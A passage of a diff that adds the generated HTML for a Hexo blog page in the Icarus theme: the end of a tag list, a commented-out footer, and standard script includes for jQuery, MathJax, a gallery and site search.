+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mockjs/">
+                        <span class="level-start">
+                            <span class="level-item">mockjs</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/php/">
+                        <span class="level-start">
+                            <span class="level-item">php</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">9</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/python/">
+                        <span class="level-start">
+                            <span class="level-item">python</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/区块链/">
+                        <span class="level-start">
+                            <span class="level-item">区块链</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/正则表达式/">
+                        <span class="level-start">
+                            <span class="level-item">正则表达式</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/生活杂谈/">
+                        <span class="level-start">
+                            <span class="level-item">生活杂谈</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <!-- <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="予笙博客" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2018 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="http://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div> -->
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
